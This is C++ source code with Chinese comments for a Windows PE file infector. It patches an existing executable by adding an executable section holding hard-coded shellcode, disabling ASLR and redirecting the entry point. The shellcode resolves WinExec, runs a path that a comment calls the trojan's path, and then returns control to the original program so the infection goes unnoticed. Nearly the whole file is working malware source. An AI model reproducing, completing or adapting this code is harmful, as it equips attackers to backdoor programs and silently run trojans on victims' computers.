#include <Windows.h>

unsigned char shellcode[] = { 0x55,0x8B,0xEC,0x83,0xEC,0x08,0x53,0x56,0x57,0xE8,0x00,0x00,0x00,0x00,0x5B,0x81,0xEB,0x12,0x10,0x40,0x00,0x64,0xA1,0x30,0x00,0x00,0x00,0x8B,0x40,0x0C,0x8B,0x40,0x14,0x8B,0x00,0x8B,0x00,0x8B,0x40,0x10,0x89,0x45,0xFC,0x03,0x40,0x3C,0x8B,0x40,0x78,0x03,0x45,0xFC,0x89,0x45,0xF8,0x33,0xF6,0x8B,0x50,0x20,0x03,0x55,0xFC,0x56,0xB9,0x07,0x00,0x00,0x00,0x8B,0x34,0xB2,0x03,0x75,0xFC,0x8D,0xBB,0x8D,0x10,0x40,0x00,0xF3,0xA6,0x74,0x09,0x5E,0x46,0x3B,0x70,0x14,0x7C,0xE3,0xEB,0x20,0x5E,0x8B,0x48,0x1C,0x03,0x4D,0xFC,0x8B,0x50,0x24,0x03,0x55,0xFC,0x0F,0xB7,0x04,0x72,0x8B,0x04,0x81,0x03,0x45,0xFC,0x6A,0x05,0x68,0x94,0x10,0x40,0x00,0xFF,0xD0,0x5F,0x5E,0x5B,0x8B,0xE5,0x5D,0xE9,0x73,0xFF,0xFF,0xFF,0x57,0x69,0x6E,0x45,0x78,0x65,0x63 };
unsigned char jmpOldOep[] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };

//对齐粒度
DWORD Aligment(DWORD dwSize, DWORD dwAlig)
{
	return (dwSize%dwAlig == 0) ? dwSize : (dwSize / dwAlig + 1)*dwAlig;
}

void main()
{
	HANDLE hFile = CreateFileA("test.exe", FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		CloseHandle(hFile);
		return;
	}
	int filesize = GetFileSize(hFile, NULL);
	char* lpMemory = new char[filesize];
	DWORD RSize = 0;
	ReadFile(hFile, lpMemory, filesize, &RSize, NULL);
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMemory;    //获取DOS头
	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)lpMemory + pDosHeader->e_lfanew); //获取NT头
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE || pNTHeader->Signature != IMAGE_NT_SIGNATURE)  //判断PE
	{
		delete[] lpMemory;
		return;
	}
	PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)&pNTHeader->FileHeader;  //通过NT头获取文件头
	if (pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL)
	{
		delete[] lpMemory;
		CloseHandle(hFile);
	}
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNTHeader->OptionalHeader; //通过NT头获取可选文件头
	PIMAGE_SECTION_HEADER pFirstSectiongHeader = IMAGE_FIRST_SECTION(pNTHeader);  //通过NT头获取第一个节表头
	int sectionNum = pFileHeader->NumberOfSections++;                             //节表数加一
	PIMAGE_SECTION_HEADER pLastSectionHeader = pFirstSectiongHeader + sectionNum; //通过第一个节表头获取新加的一个节表头
	DWORD dwFileAlig = pOptionalHeader->FileAlignment;
	DWORD dwMemAlig = pOptionalHeader->SectionAlignment;
	memcpy(pLastSectionHeader->Name, ".code", 7);
	pLastSectionHeader->Misc.VirtualSize = sizeof(shellcode);
	pLastSectionHeader->SizeOfRawData = Aligment(sizeof(shellcode), dwFileAlig);
	pLastSectionHeader->VirtualAddress = (pLastSectionHeader - 1)->VirtualAddress + Aligment((pLastSectionHeader - 1)->SizeOfRawData, dwMemAlig);  //虚拟偏移
	pLastSectionHeader->PointerToRawData = Aligment((pLastSectionHeader - 1)->PointerToRawData + (pLastSectionHeader - 1)->Misc.VirtualSize, dwFileAlig); //文件偏移
	pLastSectionHeader->Characteristics = 0xE0000060;
	pOptionalHeader->SizeOfImage = Aligment(pLastSectionHeader->VirtualAddress + pLastSectionHeader->SizeOfRawData, dwMemAlig);
	//去掉随机基址
	pOptionalHeader->DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	//修改入口点
	DWORD oldOep = pOptionalHeader->AddressOfEntryPoint;
	DWORD jmpOffest = oldOep - (pLastSectionHeader->VirtualAddress + 0x84) - sizeof(jmpOldOep);
	pOptionalHeader->AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
	*(DWORD*)&jmpOldOep[1] = jmpOffest;
	//修改文件,填入shellcode
	int newFileSize = pLastSectionHeader->PointerToRawData + pLastSectionHeader->SizeOfRawData;
	char* pNewFile = new char[newFileSize];
	ZeroMemory(pNewFile, newFileSize);
	memcpy(pNewFile, lpMemory, pLastSectionHeader->PointerToRawData);
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData, shellcode, sizeof(shellcode));
	//填入自己的路径，也就是木马的路径
	char path[MAX_PATH] = "C:\\Users\\Leech\\Desktop\\TTHexEdit.exe";
	//GetModuleFileNameA(NULL, path, MAX_PATH);
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData + sizeof(shellcode), path, strlen(path) + 1);
	//填入路径的地址偏移
	DWORD pathaddr = pLastSectionHeader->VirtualAddress + pOptionalHeader->ImageBase + sizeof(shellcode);
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData + 0x78, &pathaddr, 4);
	//填补跳转指令
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData + 0x84, jmpOldOep, sizeof(jmpOldOep));
	//写出文件
	SetFilePointer(hFile, 0, 0, FILE_BEGIN);
	DWORD dwWrite = 0;
	WriteFile(hFile, pNewFile, newFileSize, &dwWrite, NULL);
	CloseHandle(hFile);
	delete[] pNewFile;
	delete[] lpMemory;
}

